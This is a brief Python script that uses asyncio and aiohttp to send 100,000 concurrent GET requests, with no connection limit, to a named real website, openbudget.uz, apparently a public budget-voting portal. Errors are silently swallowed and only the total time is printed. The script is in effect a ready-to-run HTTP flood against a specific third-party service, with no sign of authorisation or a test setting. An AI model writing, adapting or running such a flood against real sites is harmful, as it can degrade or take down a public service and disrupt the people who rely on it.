import asyncio
import aiohttp
import time

URL = "https://openbudget.uz/home"
TOTAL_REQUESTS = 100_000

async def send_request(session, request_id):
    """Sends an asynchronous request and prints status"""
    try:
        async with session.get(URL) as response:
            status = response.status
            # Uncomment the next line if you want to see responses (may slow down the script)
            # print(f"[{request_id}] Response: {status}")
    except Exception as e:
        # Uncomment the next line if you want to see errors (may slow down the script)
        # print(f"[{request_id}] Request failed: {e}")
        pass

async def main():
    # Create a single session with keep-alive enabled
    connector = aiohttp.TCPConnector(limit=0)  # No limit on connections
    async with aiohttp.ClientSession(connector=connector) as session:
        # Create all tasks at once
        tasks = [send_request(session, i) for i in range(TOTAL_REQUESTS)]
        # Send all requests simultaneously
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    start_time = time.time()
    asyncio.run(main())
    end_time = time.time()
    print(f"Completed {TOTAL_REQUESTS} requests in {end_time - start_time:.2f} seconds")